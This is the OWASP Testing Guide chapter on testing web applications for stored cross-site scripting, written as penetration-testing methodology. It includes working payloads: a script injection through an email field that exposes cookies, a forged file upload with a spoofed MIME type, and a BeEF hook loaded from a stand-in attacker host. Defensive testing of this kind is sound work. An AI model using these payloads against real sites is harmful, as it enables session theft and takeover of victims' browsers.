<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>4.8.2 Testing for Stored Cross Site Scripting (OTG-INPVAL-002)  </title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
  
    <script type="text/javascript">
        function in_frame () { try { return window.self !== window.top; } catch (e) { return true; } }
        if (!in_frame()) {
            var page = location.pathname.substring(location.pathname.lastIndexOf("/") + 1);
            window.location = 'index.html#' + page;
        }
    </script>
</head>
<body><div class="page"><h1 class="title">4.8.2 Testing for Stored Cross Site Scripting (OTG-INPVAL-002)  </h1><br/><br /><h2>Summary</h2><br />Stored <a href="https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)">Cross-site Scripting (XSS)</a>  is the most dangerous type of Cross Site Scripting. Web applications  that allow users to store data are potentially exposed to this type of  attack. This chapter illustrates examples of stored cross site scripting  injection and related exploitation scenarios. <br /><br /> Stored XSS occurs when a web application gathers input from a user which  might be malicious, and then stores that input in a data store for  later use. The input that is stored is not correctly filtered. As a  consequence, the malicious data will appear to be part of the web site  and run within the user’s browser under the privileges of the web  application. Since this vulnerability typically involves at least two  requests to the application, this may also called second-order XSS. <br /><br /> This vulnerability can be used to conduct a number of browser-based attacks including: <br />•  Hijacking another user's browser<br />•  Capturing sensitive information viewed by application users<br />•  Pseudo defacement of the application<br />•  Port scanning of internal hosts ("internal" in relation to the users of the web application)<br />•  Directed delivery of browser-based exploits<br />•  Other malicious activities<br /><br /> Stored XSS does not need a malicious link to be exploited. A successful  exploitation occurs when a user visits a page with a stored XSS. The  following phases relate to a typical stored XSS attack scenario: <br />•  Attacker stores malicious code into the vulnerable page<br />•  User authenticates in the application<br />•  User visits vulnerable page<br />•  Malicious code is executed by the user's browser<br /><br /> This type of attack can also be exploited with browser exploitation frameworks such as <a href="http://www.beefproject.com">BeEF</a>, <a href="http://xss-proxy.sourceforge.net/">XSS Proxy</a> and <a href="http://www.gnucitizen.org/projects/backframe/">Backframe</a>. These frameworks allow for complex JavaScript exploit development. <br /><br /> Stored XSS is particularly dangerous in application areas where users  with high privileges have access. When the administrator visits the  vulnerable page, the attack is automatically executed by their browser.  This might expose sensitive information such as session authorization  tokens. <br /><br /><h2>How to Test</h2><br /><br /><h3>Black Box testing</h3><br />The process for identifying stored XSS vulnerabilities is similar to the process described during the <a href="https://www.owasp.org/index.php/Testing_for_Reflected_Cross_site_scripting_(OTG-INPVAL-001)">testing for reflected XSS</a>. <br /><br /> <strong>Input Forms</strong> <br />The first step is to identify all points where user input is  stored into the back-end and then displayed by the application.  Typical  examples of stored user input can be found in: <br />•  User/Profiles page: the application allows the user to edit/change profile details such as first name, last name, nickname, avatar, picture, address, etc.<br />•  Shopping cart: the application allows the user to store items into the shopping cart which can then be reviewed later<br />•  File Manager: application that allows upload of files<br />•  Application settings/preferences: application that allows the user to set preferences<br />•  Forum/Message board: application that permits exchange of posts among users<br />•  Blog: if the blog application permits to users submitting comments<br />•  Log: if the application stores some users input into logs.<br /><br /> <strong>Analyze HTML code</strong> <br />Input stored by the application is normally used in HTML tags,  but it can also be found as part of JavaScript content. At this stage,  it is fundamental to understand if input is stored and how it is  positioned in the context of the page. Differently from reflected XSS,  the pen-tester should also investigate any out-of-band channels through  which the application receives and stores users input. <br /><br /> <strong>Note</strong>: All areas of the application accessible by administrators  should be tested to identify the presence of any data submitted by  users.  <br /><br /> <strong>Example</strong>: Email stored data in index2.php <br /><img src="images/31-1.png" alt="images/31-1.png" /> <br /><br /> The HTML code of index2.php where the email value is located: <br />&lt;input class="inputbox" type="text" name="email" size="40" value="aaa@aa.com" /&gt;<br /><br /> In this case, the tester needs to find a way to inject code outside the &lt;input&gt; tag as below: <br />&lt;input class="inputbox" type="text" name="email" size="40" value="aaa@aa.com"&gt; MALICIOUS CODE &lt;!-- /&gt;<br /><br /> <strong>Testing for Stored XSS</strong> <br />This involves testing the input validation and filtering controls of the application. Basic injection examples in this case: <br />aaa@aa.com"&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;aaa@aa.com%22%3E%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E<br /> Ensure the input is submitted through the application. This normally  involves disabling JavaScript if client-side security controls are  implemented or modifying the HTTP request with a web proxy such as <a href="https://www.owasp.org/index.php/OWASP_WebScarab_Project">WebScarab</a>.  It is also important to test the same injection with both HTTP GET and  POST requests. The above injection results in a popup window containing  the cookie values. <br /><br /> <strong>Result Expected</strong>: <br /><img src="images/31-2.png" alt="images/31-2.png" /> <br /><br /> The HTML code following the injection: <br />&lt;input class="inputbox" type="text" name="email" size="40" value="aaa@aa.com"&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br /> The input is stored and the XSS payload is executed by the browser when  reloading the page. If the input is escaped by the application, testers  should test the application for XSS filters. For instance, if the string  "SCRIPT" is replaced by a space or by a NULL character then this could  be a potential sign of XSS filtering in action. Many techniques exist in  order to evade input filters (see <a href="https://www.owasp.org/index.php/Testing_for_Reflected_Cross_site_scripting_(OTG-INPVAL-001)">testing for reflected XSS</a> chapter). It is strongly recommended that testers refer to <a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet">XSS Filter Evasion</a> ,  <a href="http://ha.ckers.org/xss.html">RSnake</a> and <a href="https://h4k.in/encoding/">Mario</a>  XSS Cheat pages, which provide an extensive list of XSS attacks and  filtering bypasses. Refer to the whitepapers and tools section for more  detailed information. <br /><br /> <strong>Leverage Stored XSS with BeEF</strong> <br />Stored XSS can be exploited by advanced JavaScript exploitation frameworks such as <a href="http://www.beefproject.com">BeEF</a>, <a href="http://xss-proxy.sourceforge.net/">XSS Proxy</a> and <a href="http://www.gnucitizen.org/projects/backframe/">Backframe</a>.  <br /><br /> A typical BeEF exploitation scenario involves: <br />•  Injecting a JavaScript hook which communicates to the attacker's browser exploitation framework (BeEF)<br />•  Waiting for the application user to view the vulnerable page where the stored input is displayed<br />•  Control the application user’s browser via the BeEF console<br /><br /> The JavaScript hook can be injected by exploiting the XSS vulnerability in the web application. <br /><strong>Example</strong>: BeEF Injection in index2.php: <br />aaa@aa.com”&gt;&lt;script src=http://attackersite/hook.js&gt;&lt;/script&gt;<br /> When the user loads the page index2.php, the script hook.js is executed  by the browser. It is then possible to access cookies, user screenshot,  user clipboard, and launch complex XSS attacks. <br /><br /> <strong>Result Expected</strong> <br /><img src="images/31-3.png" alt="images/31-3.png" /> <br />This attack is particularly effective in vulnerable pages that are viewed by many users with different privileges. <br /><br /> <strong>File Upload</strong> <br />If the web application allows file upload, it is important to  check if it is possible to upload HTML content. For instance, if HTML or  TXT files are allowed, XSS payload can be injected in the file  uploaded. The pen-tester should also verify if the file upload allows  setting arbitrary MIME types. <br /><br /> Consider the following HTTP POST request for file upload: <br />POST /fileupload.aspx HTTP/1.1<br />[…]<br /><br />Content-Disposition: form-data; name="uploadfile1"; filename="C:\Documents and Settings\test\Desktop\test.txt"<br />Content-Type: text/plain<br /><br />test<br /><br /> This design flaw can be exploited in browser MIME mishandling attacks.  For instance, innocuous-looking files like JPG and GIF can contain an  XSS payload that is executed when they are loaded by the browser. This  is possible when the MIME type for an image such as image/gif can  instead be set to text/html. In this case the file will be treated by  the client browser as HTML. <br /><br /> HTTP POST Request forged: <br />Content-Disposition: form-data; name="uploadfile1"; filename="C:\Documents and Settings\test\Desktop\test.gif"<br />Content-Type: text/html<br /><br />&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br /><br /> Also consider that Internet Explorer does not handle MIME types in the  same way as Mozilla Firefox or other browsers do. For instance, Internet  Explorer handles TXT files with HTML content as HTML content. For  further information about MIME handling, refer to the whitepapers  section at the bottom of this chapter. <br /><br /> <br /><br /><h3>Gray Box testing</h3><br />Gray Box testing is similar to Black box testing. In gray box  testing, the pen-tester has partial knowledge of the application. In  this case, information regarding user input, input validation controls,  and data storage might be known by the pen-tester. <br /><br /> Depending on the information available, it is normally recommended that  testers check how user input is processed by the application and then  stored into the back-end system. The following steps are recommended: <br />•  Use front-end application and enter input with special/invalid characters<br />•  Analyze application response(s)<br />•  Identify presence of input validation controls<br />•  Access back-end system and check if input is stored and how it is stored<br />•  Analyze source code and understand how stored input is rendered by the application<br /><br /> If source code is available (White Box), all variables used in input  forms should be analyzed. In particular, programming languages such as  PHP, ASP, and JSP make use of predefined variables/functions to store  input from HTTP GET and POST requests. <br /><br /> The following table summarizes some special variables and functions to look at when analyzing source code: <br /><table class="table"><col/><col/><col/><tr><th>click me</th><th>click me</th><th>click me</th></tr><tr><td> PHP </td><td> ASP </td><td> JSP</td></tr><tr><td>•  $_GET - HTTP GET variables
•  $_POST - HTTP POST variables
•  $_REQUEST – http POST, GET and COOKIE variables
•  $_FILES - HTTP File Upload variables
</td><td>•  Request.QueryString - HTTP GET
•  Request.Form - HTTP POST
•  Server.CreateObject - used to upload files
</td><td>•  doGet, doPost servlets - HTTP GET and POST
•  request.getParameter - HTTP GET/POST variables
</td></tr></table><br /><br /> <strong>Note</strong>: The table above is only a summary of the most important parameters but, all user input parameters should be investigated. <br /><br /><h2>Tools</h2><br />•  <a href="https://www.owasp.org/index.php/OWASP_CAL9000_Project">OWASP CAL9000</a> <br />CAL9000 includes a sortable implementation of RSnake's XSS Attacks,  Character Encoder/Decoder, HTTP Request Generator and Response  Evaluator, Testing Checklist, Automated Attack Editor and much more.  <br />•  <strong>PHP Charset Encoder(PCE)</strong> - <a href="http://h4k.in/encoding">http://h4k.in/encoding</a><br />PCE helps you encode arbitrary texts to and from 65 kinds of character sets that you can use in your customized payloads. <br />•  <strong>Hackvertor</strong> - <a href="http://www.businessinfo.co.uk/labs/hackvertor/hackvertor.php">http://www.businessinfo.co.uk/labs/hackvertor/hackvertor.php</a><br />Hackvertor is an online tool which allows many types of encoding and obfuscation of JavaScript (or any string input). <br />•  <strong>BeEF</strong> - <a href="http://www.beefproject.com">http://www.beefproject.com</a><br />BeEF is the browser exploitation framework. A professional tool to demonstrate the real-time impact of browser vulnerabilities. <br />•  <strong>XSS-Proxy</strong> - <a href="http://xss-proxy.sourceforge.net/">http://xss-proxy.sourceforge.net/</a><br />XSS-Proxy is an advanced Cross-Site-Scripting (XSS) attack tool. <br />•  <strong>Backframe</strong> - <a href="http://www.gnucitizen.org/projects/backframe/">http://www.gnucitizen.org/projects/backframe/</a><br />Backframe is a full-featured attack console for exploiting WEB browsers, WEB users, and WEB applications. <br />•  <a href="https://www.owasp.org/index.php/OWASP_WebScarab_Project">WebScarab</a><br />WebScarab is a framework for analyzing applications that communicate using the HTTP and HTTPS protocols. <br />•  <strong>Burp</strong> - <a href="http://portswigger.net/burp/">http://portswigger.net/burp/</a><br />Burp Proxy is an interactive HTTP/S proxy server for attacking and testing web applications.  <br />•  <strong>XSS Assistant</strong> - <a href="http://www.greasespot.net/">http://www.greasespot.net/</a><br />Greasemonkey script that allow users to easily test any web application for cross-site-scripting flaws. <br />•  <strong>OWASP Zed Attack Proxy (ZAP)</strong> - <a href="https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project">OWASP_Zed_Attack_Proxy_Project</a><br />ZAP is an easy to use integrated penetration testing tool for finding  vulnerabilities in web applications. It is designed to be used by  people with a wide range of security experience and as such is ideal for  developers and functional testers who are new to penetration testing.  ZAP provides automated scanners as well as a set of tools that allow you  to find security vulnerabilities manually. <br /><br /> <br /><br /><h2>References</h2><br /><strong>OWASP Resources</strong><br /> <br />• <a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet">XSS Filter Evasion Cheat Sheet</a> <br /><br /> <strong>Books</strong><br /> <br />•  Joel Scambray, Mike Shema, Caleb Sima - "Hacking Exposed Web Applications", Second Edition, McGraw-Hill, 2006 - <a href="https://www.owasp.org/index.php/Special:BookSources/0072262290">ISBN 0-07-226229-0</a><br />•  Dafydd Stuttard, Marcus Pinto - "The Web Application's Handbook - Discovering and Exploiting Security Flaws", 2008, Wiley, <a href="https://www.owasp.org/index.php/Special:BookSources/9780470170779">ISBN 978-0-470-17077-9</a><br />•  Jeremiah Grossman, Robert "RSnake" Hansen, Petko "pdp" D. Petkov, Anton Rager, Seth Fogie - "Cross Site Scripting Attacks: XSS Exploits and Defense", 2007, Syngress, ISBN-10: 1-59749-154-3<br /><br /> <strong>Whitepapers</strong><br /> <br />•  RSnake: "XSS (Cross Site Scripting) Cheat Sheet" - <a href="http://ha.ckers.org/xss.html">http://ha.ckers.org/xss.html</a><br />•  CERT: "CERT Advisory CA-2000-02 Malicious HTML Tags Embedded in Client Web Requests" - <a href="http://www.cert.org/advisories/CA-2000-02.html">http://www.cert.org/advisories/CA-2000-02.html</a><br />•  Amit Klein: "Cross-site Scripting Explained" - <a href="http://courses.csail.mit.edu/6.857/2009/handouts/css-explained.pdf">http://courses.csail.mit.edu/6.857/2009/handouts/css-explained.pdf</a><br />•  Gunter Ollmann: "HTML Code Injection and Cross-site Scripting" - <a href="http://www.technicalinfo.net/papers/CSS.html">http://www.technicalinfo.net/papers/CSS.html</a><br />•  CGISecurity.com: "The Cross Site Scripting FAQ" - <a href="http://www.cgisecurity.com/xss-faq.html">http://www.cgisecurity.com/xss-faq.html</a><br />•  Blake Frantz: "Flirting with MIME Types: A Browser's Perspective" - <a href="http://www.leviathansecurity.com/pdf/Flirting%20with%20MIME%20Types.pdf">http://www.leviathansecurity.com/pdf/Flirting%20with%20MIME%20Types.pdf</a><br /></div></body></html>